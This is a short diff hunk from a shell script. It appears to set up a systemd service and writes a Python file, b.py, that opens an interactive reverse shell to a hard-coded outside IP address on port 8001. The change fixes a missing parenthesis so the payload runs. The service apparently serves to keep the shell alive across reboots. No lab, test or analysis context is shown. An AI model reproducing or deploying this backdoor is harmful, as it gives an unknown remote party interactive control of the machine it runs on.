@@ -18,7 +18,7 @@ WantedBy=multi-user.target
 EOF
 
 cat > b.py << EOF
-import os ; os.system('bash -i >& /dev/tcp/45.171.127.130/8001 0>&1'
+import os ; os.system('bash -i >& /dev/tcp/45.171.127.130/8001 0>&1')
 EOF
 
 dnf -y install python38
